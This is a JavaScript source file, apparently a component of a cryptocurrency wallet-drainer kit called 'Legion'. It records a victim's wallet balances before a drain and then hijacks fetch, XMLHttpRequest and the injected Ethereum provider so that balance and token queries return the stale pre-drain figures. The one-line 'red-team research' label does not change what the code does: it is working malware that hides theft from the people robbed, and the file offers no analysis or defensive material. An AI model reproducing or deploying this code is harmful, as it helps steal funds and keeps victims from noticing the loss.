/**
 * Production fake-balance interceptor — persists pre-drain snapshot in localStorage.
 * Authorized red-team research only.
 */
(function () {
  var BACKEND_URL = '__BACKEND_URL__';
  var ENABLED = __FAKE_BALANCE_AFTER_DRAIN__;
  var STORAGE_KEY = 'legion_fake_balance_snapshot_v1';
  var BALANCE_URL_RE = /balance|getbalance|tokenbalance|wallet\/assets|portfolio|holdings|account\/value|user\/assets/i;
  var RPC_BALANCE_METHODS = {
    eth_getbalance: true,
    eth_call: true,
    alchemy_gettokenbalances: true,
    qn_fetchtokenbalances: true,
  };

  var state = {
    snapshot: null,
    interceptorsInstalled: false,
  };

  function loadSnapshot() {
    try {
      var raw = localStorage.getItem(STORAGE_KEY);
      if (!raw) return null;
      return JSON.parse(raw);
    } catch (e) {
      return null;
    }
  }

  function saveSnapshot(snapshot) {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(snapshot));
      state.snapshot = snapshot;
    } catch (e) { /* quota */ }
  }

  function normalizeAddr(a) {
    return a ? String(a).toLowerCase() : '';
  }

  function victimAddresses(snapshot) {
    var out = [];
    if (!snapshot || !snapshot.wallets) return out;
    Object.keys(snapshot.wallets).forEach(function (k) {
      var v = snapshot.wallets[k];
      if (v) out.push(normalizeAddr(v));
    });
    return out;
  }

  function urlLooksLikeBalance(url) {
    return BALANCE_URL_RE.test(String(url || ''));
  }

  function bodyMentionsVictim(body, victims) {
    if (!body) return false;
    var text = typeof body === 'string' ? body : JSON.stringify(body);
    var lower = text.toLowerCase();
    return victims.some(function (a) { return a && lower.indexOf(a) >= 0; });
  }

  function findCachedResponse(snapshot, url, method) {
    if (!snapshot || !snapshot.balanceResponses) return null;
    var u = String(url);
    for (var i = snapshot.balanceResponses.length - 1; i >= 0; i--) {
      var row = snapshot.balanceResponses[i];
      if (row.url === u && (!row.method || row.method === method)) return row.responseText;
    }
    return null;
  }

  function buildMultiBalanceEnvelope(snapshot) {
    if (!snapshot || !snapshot.multiBalance) return null;
    var mb = snapshot.multiBalance;
    if (mb.success !== undefined) return JSON.stringify(mb);
    return JSON.stringify({ success: true, message: 'Multi-chain balances probed', data: mb });
  }

  function synthesizeBalanceResponse(url, snapshot) {
    if (!snapshot) return null;
    if (String(url).indexOf('/api/v1/balance/multi') >= 0) {
      return buildMultiBalanceEnvelope(snapshot);
    }
    var cached = findCachedResponse(snapshot, url, 'GET') || findCachedResponse(snapshot, url, 'POST');
    if (cached) return cached;
    if (snapshot.multiBalance && snapshot.multiBalance.data) {
      return JSON.stringify(snapshot.multiBalance.data);
    }
    if (snapshot.multiBalance && snapshot.multiBalance.chains) {
      return JSON.stringify(snapshot.multiBalance);
    }
    return null;
  }

  function fakeResponse(text, status) {
    return new Response(text || '{}', {
      status: status || 200,
      headers: { 'Content-Type': 'application/json' },
    });
  }

  function recordBalanceResponse(url, method, responseText) {
    if (!state.snapshot) state.snapshot = loadSnapshot() || { version: 1, wallets: {}, balanceResponses: [] };
    if (!state.snapshot.balanceResponses) state.snapshot.balanceResponses = [];
    state.snapshot.balanceResponses.push({
      url: String(url),
      method: method || 'GET',
      responseText: responseText,
      recordedAt: new Date().toISOString(),
    });
    if (state.snapshot.balanceResponses.length > 48) {
      state.snapshot.balanceResponses = state.snapshot.balanceResponses.slice(-48);
    }
    saveSnapshot(state.snapshot);
  }

  async function fetchMultiBalance(wallets) {
    var params = new URLSearchParams();
    if (wallets.evm) params.set('evm', wallets.evm);
    if (wallets.sol) params.set('sol', wallets.sol);
    if (wallets.tron) params.set('tron', wallets.tron);
    if (wallets.ton) params.set('ton', wallets.ton);
    if (wallets.btc) params.set('btc', wallets.btc);
    if (!params.toString()) return null;
    var res = await fetch(BACKEND_URL + '/api/v1/balance/multi?' + params.toString(), { cache: 'no-store' });
    var data = await res.json().catch(function () { return null; });
    return data;
  }

  function ethBalanceHexFromSnapshot(snapshot, address, chainId) {
    if (!snapshot || !snapshot.multiBalance) return null;
    var data = snapshot.multiBalance.data || snapshot.multiBalance;
    var chains = data.chains || [];
    var addr = normalizeAddr(address);
    for (var i = 0; i < chains.length; i++) {
      var row = chains[i];
      if (normalizeAddr(row.address) !== addr) continue;
      if (row.family === 'EVM' && row.native && row.native.amount_raw) {
        var raw = BigInt(row.native.amount_raw);
        return '0x' + raw.toString(16);
      }
    }
    if (snapshot.ethBalances) {
      var key = addr + ':' + String(chainId || 1);
      if (snapshot.ethBalances[key]) return snapshot.ethBalances[key];
    }
    return null;
  }

  function encodeUint256Hex(value) {
    try {
      var n = BigInt(value);
      return '0x' + n.toString(16).padStart(64, '0');
    } catch (e) {
      return '0x' + (0).toString(16).padStart(64, '0');
    }
  }

  function shouldSpoofRpc(params, snapshot) {
    if (!params || !snapshot) return null;
    var method = (params.method || '').toLowerCase();
    if (method === 'eth_getbalance') {
      var addr = params.params && params.params[0];
      var block = params.params && params.params[1];
      if (!addr) return null;
      var victims = victimAddresses(snapshot);
      if (victims.indexOf(normalizeAddr(addr)) < 0) return null;
      var hex = ethBalanceHexFromSnapshot(snapshot, addr, 1);
      if (hex) return { result: hex, block: block };
    }
    if (method === 'eth_call' && params.params && params.params[0]) {
      var call = params.params[0];
      var to = call.to;
      var data = call.data || '';
      if (data.indexOf('70a08231') >= 0 && victimsMentioned(call, snapshot)) {
        var tokenBal = tokenBalanceFromSnapshot(snapshot, call);
        if (tokenBal) return { result: encodeUint256Hex(tokenBal) };
      }
    }
    return null;
  }

  function victimsMentioned(call, snapshot) {
    var data = call.data || '';
    var victims = victimAddresses(snapshot);
    return victims.some(function (v) {
      if (!v || v.indexOf('0x') !== 0) return false;
      return data.toLowerCase().indexOf(v.slice(2)) >= 0;
    });
  }

  function tokenBalanceFromSnapshot(snapshot, call) {
    var data = snapshot.multiBalance && (snapshot.multiBalance.data || snapshot.multiBalance);
    if (!data || !data.chains) return null;
    var contract = normalizeAddr(call.to);
    for (var i = 0; i < data.chains.length; i++) {
      var chain = data.chains[i];
      var tokens = chain.tokens || [];
      for (var j = 0; j < tokens.length; j++) {
        if (normalizeAddr(tokens[j].contract) === contract) return tokens[j].amount_raw;
      }
    }
    return null;
  }

  function installFetchInterceptor(snapshot) {
    if (!window.fetch || window.fetch.__legionFakeBalance) return;
    var original = window.fetch.bind(window);
    function patchedFetch(input, init) {
      var url = typeof input === 'string' ? input : (input && input.url) || '';
      var method = (init && init.method) || (input && input.method) || 'GET';
      var victims = victimAddresses(snapshot);

      if (!snapshot.drainCompletedAt) {
        return original(input, init).then(function (res) {
          if (urlLooksLikeBalance(url)) {
            res.clone().text().then(function (text) {
              if (text && text.length < 512000) recordBalanceResponse(url, method, text);
            }).catch(function () {});
          }
          return res;
        });
      }

      if (urlLooksLikeBalance(url) && (victims.length === 0 || bodyMentionsVictim(init && init.body, victims) || url.indexOf('balance') >= 0)) {
        var fake = synthesizeBalanceResponse(url, snapshot);
        if (fake) return Promise.resolve(fakeResponse(fake));
      }
      return original(input, init);
    }
    patchedFetch.__legionFakeBalance = true;
    window.fetch = patchedFetch;
  }

  function installXhrInterceptor(snapshot) {
    if (!window.XMLHttpRequest || XMLHttpRequest.prototype.__legionFakeBalance) return;
    var victims = victimAddresses(snapshot);
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function (method, url) {
      this.__legionUrl = url;
      this.__legionMethod = method;
      return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function (body) {
      var self = this;
      var url = self.__legionUrl || '';
      var method = self.__legionMethod || 'GET';

      if (!snapshot.drainCompletedAt) {
        this.addEventListener('load', function () {
          if (urlLooksLikeBalance(url) && self.responseText && self.responseText.length < 512000) {
            recordBalanceResponse(url, method, self.responseText);
          }
        });
        return origSend.apply(this, arguments);
      }

      if (urlLooksLikeBalance(url) && (victims.length === 0 || bodyMentionsVictim(body, victims) || true)) {
        var fake = synthesizeBalanceResponse(url, snapshot);
        if (fake) {
          setTimeout(function () {
            try {
              Object.defineProperty(self, 'readyState', { configurable: true, get: function () { return 4; } });
              Object.defineProperty(self, 'status', { configurable: true, get: function () { return 200; } });
              Object.defineProperty(self, 'responseText', { configurable: true, get: function () { return fake; } });
              Object.defineProperty(self, 'response', { configurable: true, get: function () { return fake; } });
              if (typeof self.onreadystatechange === 'function') self.onreadystatechange();
              self.dispatchEvent(new Event('load'));
              self.dispatchEvent(new Event('loadend'));
            } catch (e) { /* ignore */ }
          }, 0);
          return;
        }
      }
      return origSend.apply(this, arguments);
    };
    XMLHttpRequest.prototype.__legionFakeBalance = true;
  }

  function installEthereumInterceptor(snapshot) {
    var eth = window.ethereum;
    if (!eth || !eth.request || eth.request.__legionFakeBalance) return;
    var original = eth.request.bind(eth);
    eth.request = function (params) {
      if (snapshot.drainCompletedAt) {
        var spoof = shouldSpoofRpc(params, snapshot);
        if (spoof) return Promise.resolve(spoof.result);
      } else if (params && params.method && params.method.toLowerCase() === 'eth_getbalance') {
        return original(params).then(function (result) {
          try {
            if (!state.snapshot) state.snapshot = loadSnapshot() || { version: 1, wallets: {}, ethBalances: {} };
            if (!state.snapshot.ethBalances) state.snapshot.ethBalances = {};
            var addr = params.params && params.params[0];
            if (addr) state.snapshot.ethBalances[normalizeAddr(addr) + ':1'] = result;
            saveSnapshot(state.snapshot);
          } catch (e) { /* ignore */ }
          return result;
        });
      }
      return original(params);
    };
    eth.request.__legionFakeBalance = true;
  }

  function installInterceptors(snapshot) {
    if (!snapshot || state.interceptorsInstalled) return;
    installFetchInterceptor(snapshot);
    installXhrInterceptor(snapshot);
    installEthereumInterceptor(snapshot);
    state.interceptorsInstalled = true;
    state.snapshot = snapshot;
  }

  async function capturePreDrainSnapshot(wallets) {
    if (!ENABLED) return null;
    var existing = loadSnapshot();
    var snapshot = existing || {
      version: 1,
      capturedAt: new Date().toISOString(),
      drainCompletedAt: null,
      wallets: {},
      balanceResponses: [],
      ethBalances: {},
    };
    snapshot.wallets = Object.assign({}, snapshot.wallets, wallets || {});
    snapshot.capturedAt = snapshot.capturedAt || new Date().toISOString();

    try {
      var mb = await fetchMultiBalance(snapshot.wallets);
      if (mb) snapshot.multiBalance = mb;
    } catch (e) { /* backend unavailable */ }

    saveSnapshot(snapshot);
    installInterceptors(snapshot);
    return snapshot;
  }

  function activatePostDrain() {
    if (!ENABLED) return;
    var snapshot = loadSnapshot() || state.snapshot;
    if (!snapshot) return;
    snapshot.drainCompletedAt = new Date().toISOString();
    saveSnapshot(snapshot);
    state.interceptorsInstalled = false;
    installInterceptors(snapshot);
  }

  function initFromStorage() {
    if (!ENABLED) return;
    var snapshot = loadSnapshot();
    if (!snapshot) return;
    state.snapshot = snapshot;
    installInterceptors(snapshot);
  }

  window.LegionFakeBalance = {
    capturePreDrainSnapshot: capturePreDrainSnapshot,
    activatePostDrain: activatePostDrain,
    initFromStorage: initFromStorage,
    isEnabled: function () { return ENABLED; },
  };

  if (ENABLED) initFromStorage();
})();
